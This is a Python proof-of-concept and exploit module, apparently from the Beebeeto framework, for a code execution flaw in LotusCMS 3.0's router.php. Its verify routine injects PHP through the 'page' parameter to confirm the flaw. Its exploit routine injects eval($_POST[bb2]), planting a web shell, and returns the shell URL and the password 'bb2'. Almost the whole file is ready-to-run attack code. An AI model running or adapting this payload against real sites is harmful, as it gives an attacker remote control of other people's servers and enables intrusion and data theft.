#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0193',
            'name': 'LotusCMS 3.0 /core/lib/router.php 代码执行漏洞 POC & Exploit',
            'author': 'foundu',
            'create_date': '2014-12-10',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'LotusCMS',
            'vul_version': ['3.0'],
            'type': 'Code Execution',
            'tag': ['LotusCMS漏洞', '代码执行漏洞', '/core/lib/router.php', 'php'],
            'desc': 'N/A',
            'references': ['http://www.freebuf.com/articles/web/53656.html',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = '/index.php?system=Dash&page=%27);echo(md5(666));//'
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        content = urllib2.urlopen(req).read()
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        if 'fae0b27c451c728867a567e8c1bb4e53' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args


    @classmethod
    def exploit(cls, args):
        payload = '/index.php?system=Dash&page=%27);eval($_POST[bb2]);echo(md5(666));//'
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        content = urllib2.urlopen(req).read()
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        if 'fae0b27c451c728867a567e8c1bb4e53' in content:
            args['success'] = True
            args['poc_ret']['webshell'] = verify_url
            args['poc_ret']['password'] = 'bb2'
        return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())